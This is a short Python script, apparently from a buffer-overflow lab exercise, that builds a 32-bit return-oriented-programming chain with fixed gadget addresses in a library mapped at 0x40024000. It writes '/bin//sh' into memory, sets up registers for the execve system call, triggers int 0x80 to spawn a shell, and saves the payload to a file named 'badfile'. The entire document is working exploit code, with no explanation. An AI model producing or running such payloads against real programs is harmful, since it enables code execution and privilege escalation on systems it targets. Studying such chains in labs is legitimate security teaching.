from struct import pack

	# Padding goes here
p = 'A'*16
o = 0x40024000
p += pack('<I', o+0x00001a72) # pop edx ; ret
p += pack('<I', o+0x00158020) # @ .data
p += pack('<I', o+0x0002126c) # pop eax ; ret
p += '/bin'
p += pack('<I', o+0x00084a8c) # mov dword ptr [edx], eax ; pop ebp ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', o+0x00001a72) # pop edx ; ret
p += pack('<I', o+0x00158024) # @ .data + 4
p += pack('<I', o+0x0002126c) # pop eax ; ret
p += '//sh'
p += pack('<I', o+0x00084a8c) # mov dword ptr [edx], eax ; pop ebp ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', o+0x00001a72) # pop edx ; ret
p += pack('<I', o+0x00158028) # @ .data + 8
p += pack('<I', o+0x00039c6e) # xor eax, eax ; ret
p += pack('<I', o+0x00084a8c) # mov dword ptr [edx], eax ; pop ebp ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', o+0x0007145d) # pop ebx ; ret
p += pack('<I', o+0x00158020) # @ .data
p += pack('<I', o+0x000288c5) # pop ecx ; pop edx ; ret
p += pack('<I', o+0x00158028) # @ .data + 8
p += pack('<I', 0x41414141) # padding
p += pack('<I', o+0x00001a72) # pop edx ; ret
p += pack('<I', o+0x00158028) # @ .data + 8
p += pack('<I', o+0x00039c6e) # xor eax, eax ; ret
p += pack('<I', o+0x000211de) # inc eax ; ret
p += pack('<I', o+0x000211de) # inc eax ; ret
p += pack('<I', o+0x000211de) # inc eax ; ret
p += pack('<I', o+0x000211de) # inc eax ; ret
p += pack('<I', o+0x000211de) # inc eax ; ret
p += pack('<I', o+0x000211de) # inc eax ; ret
p += pack('<I', o+0x000211de) # inc eax ; ret
p += pack('<I', o+0x000211de) # inc eax ; ret
p += pack('<I', o+0x000211de) # inc eax ; ret
p += pack('<I', o+0x000211de) # inc eax ; ret
p += pack('<I', o+0x000211de) # inc eax ; ret
p += pack('<I', o+0x00025643) # int 0x80
open("badfile", "wb").write(p)
